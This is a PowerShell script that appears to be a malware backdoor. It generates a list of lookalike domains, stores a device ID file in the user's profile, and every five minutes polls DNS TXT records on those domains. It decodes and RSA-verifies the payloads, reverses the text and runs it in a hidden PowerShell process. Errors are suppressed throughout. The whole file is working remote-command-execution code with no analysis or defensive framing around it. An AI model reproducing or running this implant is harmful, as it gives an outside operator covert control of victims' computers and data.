# Domain generation function
function Initialize-DomainList {
    $domainPrefixes = @("slima", "actdivato", "yeild", "quasa", "freed")
    $domainMiddles = @("writer", "rdb", "shlow", "tfdsc", "virtualb")
    $domainSuffixes = @("com", "xyz")

    $generatedDomains = New-Object System.Collections.ArrayList

    foreach ($suffix in $domainSuffixes) {
        foreach ($prefix in $domainPrefixes) {
            foreach ($middle in $domainMiddles) {
                $null = $generatedDomains.Add("$prefix$middle.$suffix")
            }
        }
    }

    return $generatedDomains
}

# Device ID management
function Get-DeviceIdentifier {
    $userProfile = Join-Path $env:SystemDrive "Users\$env:USERNAME"
    $idFilePath = Join-Path $userProfile "devid"

    if (Test-Path $idFilePath) {
        return (Get-Content -Path $idFilePath -Raw).Trim()
    } else {
        $newId = [Guid]::NewGuid().ToString("N")
        Set-Content -Path $idFilePath -Value $newId
        return $newId
    }
}

# DNS TXT record processor
function Get-DnsUpdateContent {
    param(
        [string]$TargetHost
    )

    $memStream = New-Object System.IO.MemoryStream

    try {
        $dnsRecords = Resolve-DnsName -Name $TargetHost -Type 'TXT' -ErrorAction SilentlyContinue

        if (-not $dnsRecords) { return $null }

        $memStream.SetLength(0)
        $memStream.Position = 0

        foreach ($record in $dnsRecords) {
            try {
                if ($record.Type -ne 'TXT') { continue }

                $packetData = [string]::Join('', $record.Strings)

                if ($packetData[0] -eq '.') {
                    $decodedPacket = [System.Convert]::FromBase64String($packetData.Substring(1).Replace('_', '+'))
                    $memStream.Position = [BitConverter]::ToUInt32($decodedPacket, 0)
                    $memStream.Write($decodedPacket, 4, $decodedPacket.Length - 4)
                }
            }
            catch {
                # Silent error handling
            }
        }

        if ($memStream.Length -gt 136) {
            $memStream.Position = 0

            $signature = [byte[]]::new(128)
            $timeData = [byte[]]::new(8)
            $contentBuffer = [byte[]]::new($memStream.Length - 136)

            $memStream.Read($signature, 0, 128) | Out-Null
            $memStream.Read($timeData, 0, 8) | Out-Null
            $memStream.Read($contentBuffer, 0, $contentBuffer.Length) | Out-Null

            # RSA verification
            $rsaProvider = [Security.Cryptography.RSACryptoServiceProvider]::new()
            $rsaProvider.ImportCspBlob([byte[]]@(6,2,0,0,0,164,0,0,82,83,65,49,0,4,0,0,1,0,1,0,171,136,19,139,215,31,169,242,133,11,146,105,79,13,140,88,119,0,2,249,79,17,77,152,228,162,31,56,117,89,68,182,194,170,250,16,3,78,104,92,37,37,9,250,164,244,195,118,92,190,58,20,35,134,83,10,229,114,229,137,244,178,10,31,46,80,221,73,129,240,183,9,245,177,196,77,143,71,142,60,5,117,241,54,2,116,23,225,145,53,46,21,142,158,206,250,181,241,8,110,101,84,218,219,99,196,195,112,71,93,55,111,218,209,12,101,165,45,13,36,118,97,232,193,245,221,180,169))

            if ($rsaProvider.VerifyData($contentBuffer, [Security.Cryptography.CryptoConfig]::MapNameToOID('SHA256'), $signature)) {
                return @{
                    timestamp = ([System.BitConverter]::ToUInt64($timeData, 0))
                    content = ([Text.Encoding]::UTF8.GetString($contentBuffer))
                }
            }
        }
    }
    catch {
        # Silent error handling
    }

    return $null
}

# Command execution function
function Invoke-RemoteCommands {
    param(
        [string]$CommandText
    )

    if ([string]::IsNullOrWhiteSpace($CommandText)) { return }

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.WindowStyle = 'Hidden'
    $process.StartInfo.FileName = 'powershell.exe'
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.RedirectStandardInput = $true
    $process.StartInfo.RedirectStandardOutput = $true

    $process.Start() | Out-Null
    $process.BeginOutputReadLine()

    foreach ($line in $CommandText.Split("`r`n")) {
        if (-not [string]::IsNullOrWhiteSpace($line)) {
            $process.StandardInput.WriteLine($line)
        }
    }

    $process.StandardInput.WriteLine('')
    $process.WaitForExit()
}

# Main execution loop
function Start-CommunicationService {
    param(
        [array]$DomainList
    )

    # Get device identifier
    $deviceId = Get-DeviceIdentifier

    while ($true) {
        try {
            $latestUpdate = @{
                timestamp = 0
                content = ''
            }

            # Check all domains for updates
            foreach ($domain in $DomainList) {
                try {
                    $updateData = Get-DnsUpdateContent -TargetHost $domain

                    if ($null -ne $updateData -and $updateData.timestamp -gt $latestUpdate.timestamp) {
                        $latestUpdate = @{
                            timestamp = $updateData.timestamp
                            content = $updateData.content
                        }
                    }
                }
                catch {
                    # Silent error handling
                }
            }

            # Execute commands if we have valid content
            if ($latestUpdate.content) {
$reversedAbc = -join $latestUpdate.content[$latestUpdate.content.Length..0]
                Invoke-RemoteCommands -CommandText $reversedAbc
            }
        }
        catch {
            # Silent error handling
        }

        # Wait before next check
        Start-Sleep -Seconds 300
    }
}

# Main execution
$domains = Initialize-DomainList
Start-CommunicationService -DomainList $domains